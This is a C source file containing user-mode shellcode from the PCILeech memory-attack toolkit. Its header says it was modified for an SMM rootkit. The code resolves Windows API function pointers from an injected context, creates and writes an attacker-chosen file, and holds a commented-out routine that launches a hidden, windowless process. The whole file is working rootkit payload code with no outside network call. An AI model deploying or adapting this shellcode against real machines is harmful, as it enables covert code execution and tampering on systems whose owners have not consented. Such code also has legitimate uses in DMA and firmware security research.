// wx64_umd_exec_c.c : usermode 'umd' shellcode for PCILeech for starting and
//                     and executing a process optionally with input redirect.
//                     NB! this feature is still 'experimental'. 
//
// (c) Ulf Frisk, 2019
// Author: Ulf Frisk, pcileech@frizk.net
// Modified for SMM rootkit by Jussi Hietanen

#include <windows.h>

typedef unsigned __int64		QWORD, *PQWORD;

/*
typedef struct tdUMD_EXEC_CONTEXT_LIMITED {
    LONG64 fCMPXCHG;
    CHAR fStatus;
    HANDLE hProcessHandle;
    struct {
        QWORD CloseHandle;
        QWORD CreateFileA;
        QWORD CreateProcessA;
        QWORD CreateThread;
        QWORD GetExitCodeProcess;
        QWORD ReadFile;
        QWORD WriteFile;
        QWORD LocalAlloc;
    } fn;
    CHAR szString1[100];
    CHAR szString2[100];
} UMD_EXEC_CONTEXT_LIMITED, *PUMD_EXEC_CONTEXT_LIMITED;
*/


typedef struct tdUMD_EXEC_CONTEXT_FULL {
    LONG64 fCMPXCHG;
    CHAR fStatus;
    HANDLE hProcessHandle;      // for future implementations maybe
    struct {
        BOOL(*CloseHandle)(
            HANDLE hObject
            );
        HANDLE(*CreateFileA)(
            LPCSTR                lpFileName,
            DWORD                 dwDesiredAccess,
            DWORD                 dwShareMode,
            LPSECURITY_ATTRIBUTES lpSecurityAttributes,
            DWORD                 dwCreationDisposition,
            DWORD                 dwFlagsAndAttributes,
            HANDLE                hTemplateFile
            );
        BOOL(*CreateProcessA)(
            LPCSTR                lpApplicationName,
            LPSTR                 lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL                  bInheritHandles,
            DWORD                 dwCreationFlags,
            LPVOID                lpEnvironment,
            LPCSTR                lpCurrentDirectory,
            LPSTARTUPINFOA        lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
            );
        HANDLE(*CreateThread)(
            LPSECURITY_ATTRIBUTES   lpThreadAttributes,
            SIZE_T                  dwStackSize,
            LPTHREAD_START_ROUTINE  lpStartAddress,
            __drv_aliasesMem LPVOID lpParameter,
            DWORD                   dwCreationFlags,
            LPDWORD                 lpThreadId
            );
        BOOL(*GetExitCodeProcess)(
            HANDLE  hProcess,
            LPDWORD lpExitCode
            );
        BOOL(*ReadFile)(
            HANDLE       hFile,
            LPVOID       lpBuffer,
            DWORD        nNumberOfBytesToRead,
            LPDWORD      lpNumberOfBytesRead,
            LPOVERLAPPED lpOverlapped
            );
        BOOL(*WriteFile)(
            HANDLE       hFile,
            LPCVOID      lpBuffer,
            DWORD        nNumberOfBytesToWrite,
            LPDWORD      lpNumberOfBytesWritten,
            LPOVERLAPPED lpOverlapped
            );
        HLOCAL(*LocalAlloc)(
            UINT   uFlags,
            SIZE_T uBytes
            );
    } fn;
    CHAR szString1[100];
    CHAR szString2[100];
} UMD_EXEC_CONTEXT_FULL, *PUMD_EXEC_CONTEXT_FULL;



VOID c_EntryPoint(PUMD_EXEC_CONTEXT_FULL ctx)
{
    // no function addresses -> invalid context!
    if(!ctx->fn.CloseHandle)
    {
        return;
    }

    //
    // File creation example
    //
    HANDLE filee = ctx->fn.CreateFileA(ctx->szString1, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(filee == INVALID_HANDLE_VALUE)
    {
        return;
    }
    ctx->fn.WriteFile(filee, ctx->szString2, 16, NULL, NULL);
    ctx->fn.CloseHandle(filee);

    /*
    // Process creation example
    //
    LPSTARTUPINFO psi = ctx->fn.LocalAlloc(LMEM_ZEROINIT, sizeof(STARTUPINFO));
    PROCESS_INFORMATION pi;
    // set up data
    psi->cb = sizeof(STARTUPINFO);
    psi->dwFlags = STARTF_USESTDHANDLES;
    // launch executable with CREATE_NO_WINDOW as Process Creation Flags
    ctx->fn.CreateProcessA(NULL, ctx->szString1, NULL, NULL, TRUE, 0x08000000, NULL, NULL, psi, &pi)
    */
    ctx->fStatus = 0xff;
    return;
}
